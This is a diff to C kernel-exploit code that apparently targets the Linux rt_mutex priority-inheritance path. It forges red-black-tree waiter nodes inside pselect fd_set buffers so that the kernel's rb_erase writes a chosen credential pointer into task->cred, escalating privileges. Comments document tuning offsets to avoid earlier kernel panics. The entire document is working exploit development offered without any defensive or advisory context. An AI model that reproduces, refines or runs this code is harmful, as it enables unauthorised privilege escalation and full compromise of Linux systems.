@@ -425,10 +425,18 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
            * page forever (polls own CapEff in MODE4_CAPS_CHILD), so the
            * cred lifetime is guaranteed — campaign v1's parent-page cred
            * had no lifetime guarantee for the child. */
-          g_main_pc = (uint64_t)g_child_cred;
-          g_main_left = (uint64_t)pselect_write_target();
-          pr_info("JC2 CAPSONLY v2: pc=%016llx (child caps-cred) "
-                  "left=%016llx (task+0x780)\n",
+          /* CHANGE_CHILD DELIVERY (jc40 decode): rb_erase(ghost) with
+           * pc=parent must be RED (bit0=1) or __rb_erase_color walks
+           * crafted parents into unmapped memory (the jc40 KP). RED node
+           * + one child = no rebalance. Geometry: parent = pc&~3 =
+           * task+0x778; change_child writes the RIGHT slot *(parent+8) =
+           * *(task+0x780) = child(word2) — task->cred = VALUE, exactly
+           * the DUAL target. word7 lock = self-lock; root=leftmost=ghost
+           * passes the top->lock==lock EQUAL gate into the erase. */
+          g_main_pc = ((uint64_t)(g_child_task + 0x778)) | 1ULL;
+          g_main_left = (uint64_t)g_child_cred;
+          pr_info("JC2 CAPSONLY v2 CC: pc=%016llx (task+0x778|RED) "
+                  "left=%016llx (VALUE=cred)\n",
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
         }
@@ -533,7 +541,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
          * (negative) delta makes the kernel read wait_lock/root from the
          * zero band → clean gate exit, never a qspinlock hang (the jc28
          * wedge class). Only the exact delta roots the tree at the ghost. */
-        ghost_lock_word = g_ghost_kva + 0xA0;
+        ghost_lock_word = g_ghost_kva + 0x50;
         ex_stamp[0] = 0;            /* word20 wait_lock: unlocked      */
         ex_stamp[1] = g_ghost_kva;  /* word21 waiters root = ghost     */
         ex_stamp[2] = g_ghost_kva;  /* word22 waiters leftmost = ghost */
@@ -557,7 +565,14 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
            * → KP. pc=0 is the ONLY self-consistent terminator. The
            * earlier pc=0 KP had a different cause: SPINSTAMP re-stamping
            * DURING the walk (fixed by stop-on-calls). */
-          {3, 0, "pi_parent"},
+          /* PI TREE = THE DELIVERY CHANNEL: the walk's dequeue_pi runs
+           * rb_erase(ghost.pi_node) using THESE words — Case left-only
+           * {pc=value, right=0, left=target} stores *(left)=pc. The 09-21
+           * pc=0 change DISARMED this (root-case erase, no store — the
+           * jc37 confirm: clean walk, no delivery). The reinsert fear was
+           * misplaced: enqueue's rb_link_node overwrites pc BEFORE
+           * insert_color walks parents. */
+          {3, g_pi_parent, "pi_parent"},
           {4, 0, "pi_right"},
           {5, g_pi_left, "pi_left"},
           {6, ghost_task, "task"},
@@ -575,10 +590,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
         /* waiter words 20..23 (ex[4..7] at NFDS=512): the lock block;
          * words 10..19 stay ZERO (the negative-delta safety band). */
         struct pselect_waiter_word lock_words[] = {
-            {20, ex_stamp[0], "lk_wait_lock"},
-            {21, ex_stamp[1], "lk_root"},
-            {22, ex_stamp[2], "lk_leftmost"},
-            {23, ex_stamp[3], "lk_owner"},
+            {10, ex_stamp[0], "lk_wait_lock"},
+            {11, ex_stamp[1], "lk_root"},
+            {12, ex_stamp[2], "lk_leftmost"},
+            {13, ex_stamp[3], "lk_owner"},
         };
         for (size_t i = 0; i < sizeof(lock_words) / sizeof(lock_words[0]);
              i++)
